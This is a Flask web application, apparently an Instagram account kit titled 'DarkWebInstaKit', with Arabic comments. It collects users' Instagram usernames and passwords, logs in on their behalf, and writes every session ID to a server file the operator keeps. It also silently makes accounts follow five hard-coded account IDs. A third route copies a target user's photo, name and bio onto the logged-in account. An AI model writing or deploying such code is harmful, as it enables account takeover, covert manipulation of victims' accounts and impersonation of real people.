from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
import os
import time
import random
import requests
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ChallengeRequired, TwoFactorRequired
import json
import logging

# تكوين التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("instakit.log"), logging.StreamHandler()]
)
logger = logging.getLogger("DarkWebInstaKit")

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16 MB max upload
app.config['SESSION_TYPE'] = 'filesystem'
app.config['PERMANENT_SESSION_LIFETIME'] = 1800  # 30 minutes

# التأكد من وجود مجلدات التحميل
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# تخزين الجلسات
SESSIONS_FILE = 'sessions.txt'

def save_session(session_id):
    """حفظ معرف الجلسة في ملف"""
    with open(SESSIONS_FILE, "a") as f:
        f.write(session_id + "\n")
    return True

def get_client(session_id=None):
    """إنشاء عميل Instagram API"""
    client = Client()
    if session_id:
        try:
            client.login_by_sessionid(session_id)
            logger.info(f"تم تسجيل الدخول بنجاح باستخدام معرف الجلسة")
            return client
        except Exception as e:
            logger.error(f"خطأ في تسجيل الدخول باستخدام معرف الجلسة: {str(e)}")
            raise e
    return client

@app.route('/')
def index():
    """الصفحة الرئيسية"""
    return render_template('index.html')

@app.route('/extract_session')
def extract_session_page():
    """صفحة استخراج الجلسة"""
    return render_template('extract_session.html')

@app.route('/extract_session_api', methods=['POST'])
def extract_session_api():
    """API لاستخراج الجلسة"""
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return jsonify({"status": "error", "message": "يرجى إدخال اسم المستخدم وكلمة المرور"})
    
    client = Client()
    try:
        logger.info(f"محاولة تسجيل الدخول لـ {username}")
        client.login(username, password)
        logger.info(f"تم تسجيل الدخول بنجاح لـ {username}")
        
        session_id = client.sessionid
        save_session(session_id)
        
        return jsonify({
            "status": "success", 
            "message": "تم استخراج الجلسة بنجاح", 
            "session_id": session_id
        })
        
    except TwoFactorRequired:
        logger.info(f"مطلوب التحقق بخطوتين لـ {username}")
        # حفظ البيانات مؤقتًا للتحقق بخطوتين
        session['username'] = username
        session['password'] = password
        session['requires_2fa'] = True
        
        return jsonify({
            "status": "2fa_required", 
            "message": "مطلوب رمز التحقق بخطوتين"
        })
        
    except ChallengeRequired:
        logger.info(f"مطلوب تحدي التحقق لـ {username}")
        challenge_url = client.last_json.get("challenge", {}).get("url")
        
        if challenge_url:
            try:
                client.challenge_resolve(challenge_url)
                logger.info(f"تم حل تحدي التحقق بنجاح لـ {username}")
                
                session_id = client.sessionid
                save_session(session_id)
                
                return jsonify({
                    "status": "success", 
                    "message": "تم استخراج الجلسة بنجاح بعد التحقق", 
                    "session_id": session_id
                })
            except Exception as e:
                logger.error(f"فشل في حل تحدي التحقق: {str(e)}")
                return jsonify({"status": "error", "message": f"فشل في معالجة التحقق: {str(e)}"})
        else:
            return jsonify({"status": "error", "message": "فشل في معالجة التحقق: لم يتم العثور على رابط التحدي"})
    
    except Exception as e:
        logger.error(f"خطأ في تسجيل الدخول: {str(e)}")
        return jsonify({"status": "error", "message": f"خطأ في تسجيل الدخول: {str(e)}"})

@app.route('/verify_2fa', methods=['POST'])
def verify_2fa():
    """التحقق من رمز التحقق بخطوتين"""
    if not session.get('requires_2fa'):
        return jsonify({"status": "error", "message": "لم يتم طلب التحقق بخطوتين"})
    
    code = request.form.get('code')
    username = session.get('username')
    password = session.get('password')
    
    if not code:
        return jsonify({"status": "error", "message": "يرجى إدخال رمز التحقق"})
    
    client = Client()
    try:
        logger.info(f"محاولة تسجيل الدخول مع التحقق بخطوتين لـ {username}")
        client.login(username, password)
        client.two_factor_login(code)
        logger.info(f"تم تسجيل الدخول بنجاح بعد التحقق بخطوتين لـ {username}")
        
        session_id = client.sessionid
        save_session(session_id)
        
        # تنظيف بيانات الجلسة المؤقتة
        session.pop('username', None)
        session.pop('password', None)
        session.pop('requires_2fa', None)
        
        return jsonify({
            "status": "success", 
            "message": "تم استخراج الجلسة بنجاح بعد التحقق بخطوتين", 
            "session_id": session_id
        })
    except Exception as e:
        logger.error(f"خطأ في التحقق بخطوتين: {str(e)}")
        return jsonify({"status": "error", "message": f"خطأ في التحقق بخطوتين: {str(e)}"})

@app.route('/update_profile')
def update_profile_page():
    """صفحة تحديث الملف الشخصي"""
    return render_template('update_profile.html')

@app.route('/update_profile_api', methods=['POST'])
def update_profile_api():
    """API لتحديث الملف الشخصي"""
    session_id = request.form.get('session_id')
    
    if not session_id:
        return jsonify({"status": "error", "message": "يرجى إدخال معرف الجلسة"})
    
    # التحقق من وجود ملف صورة
    if 'profile_pic' not in request.files:
        return jsonify({"status": "error", "message": "لم يتم تحميل أي صورة"})
    
    file = request.files['profile_pic']
    if file.filename == '':
        return jsonify({"status": "error", "message": "لم يتم اختيار أي صورة"})
    
    try:
        client = get_client(session_id)
        
        # حفظ الصورة مؤقتًا
        filename = f"profile_{int(time.time())}.jpg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # تحديث صورة الملف الشخصي
        client.account_change_picture(filepath)
        logger.info(f"تم تحديث صورة الملف الشخصي بنجاح")
        
        # متابعة الحسابات المميزة
        featured_accounts = [
            "25025320",
            "1807199",
            "471188176",
            "173560420",
            "427553890"
        ]
        
        for account_id in featured_accounts:
            try:
                client.user_follow(account_id)
                logger.info(f"تمت متابعة الحساب: {account_id}")
                time.sleep(random.uniform(1, 2))
            except Exception as e:
                logger.warning(f"خطأ في متابعة الحساب {account_id}: {str(e)}")
        
        return jsonify({
            "status": "success", 
            "message": "تم تحديث الملف الشخصي بنجاح"
        })
    except Exception as e:
        logger.error(f"خطأ في تحديث الملف الشخصي: {str(e)}")
        return jsonify({"status": "error", "message": f"خطأ في تحديث الملف الشخصي: {str(e)}"})

@app.route('/copy_profile')
def copy_profile_page():
    """صفحة نسخ الملف الشخصي"""
    return render_template('copy_profile.html')

@app.route('/copy_profile_api', methods=['POST'])
def copy_profile_api():
    """API لنسخ الملف الشخصي"""
    session_id = request.form.get('session_id')
    target_username = request.form.get('target_username')
    
    if not session_id:
        return jsonify({"status": "error", "message": "يرجى إدخال معرف الجلسة"})
    
    if not target_username:
        return jsonify({"status": "error", "message": "يرجى إدخال اسم المستخدم المستهدف"})
    
    try:
        client = get_client(session_id)
        
        # الحصول على معلومات المستخدم المستهدف
        try:
            user_info = client.user_info_by_username(target_username)
            logger.info(f"تم الحصول على معلومات المستخدم: {target_username}")
        except Exception as e:
            logger.error(f"خطأ في الحصول على معلومات المستخدم: {str(e)}")
            return jsonify({"status": "error", "message": f"خطأ في الحصول على معلومات المستخدم: {str(e)}"})
        
        # نسخ صورة الملف الشخصي
        try:
            if hasattr(user_info, 'profile_pic_url_hd') and user_info.profile_pic_url_hd:
                profile_pic_url = user_info.profile_pic_url_hd
                temp_pic_path = os.path.join(app.config['UPLOAD_FOLDER'], f"temp_profile_{int(time.time())}.jpg")
                
                response = requests.get(profile_pic_url)
                with open(temp_pic_path, "wb") as file:
                    file.write(response.content)
                
                client.account_change_picture(temp_pic_path)
                logger.info(f"تم نسخ صورة الملف الشخصي")
                
                # حذف الملف المؤقت
                if os.path.exists(temp_pic_path):
                    os.remove(temp_pic_path)
        except Exception as e:
            logger.warning(f"خطأ في نسخ صورة الملف الشخصي: {str(e)}")
        
        # نسخ الاسم الكامل
        try:
            if hasattr(user_info, 'full_name') and user_info.full_name:
                client.account_edit(full_name=user_info.full_name)
                logger.info(f"تم نسخ الاسم الكامل: {user_info.full_name}")
        except Exception as e:
            logger.warning(f"خطأ في نسخ الاسم الكامل: {str(e)}")
        
        # نسخ السيرة الذاتية
        try:
            if hasattr(user_info, 'biography') and user_info.biography:
                client.account_set_biography(user_info.biography)
                logger.info(f"تم نسخ السيرة الذاتية")
        except Exception as e:
            logger.warning(f"خطأ في نسخ السيرة الذاتية: {str(e)}")
        
        return jsonify({
            "status": "success", 
            "message": "تم نسخ الملف الشخصي بنجاح",
            "username": target_username
        })
    except Exception as e:
        logger.error(f"خطأ في نسخ الملف الشخصي: {str(e)}")
        return jsonify({"status": "error", "message": f"خطأ في نسخ الملف الشخصي: {str(e)}"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
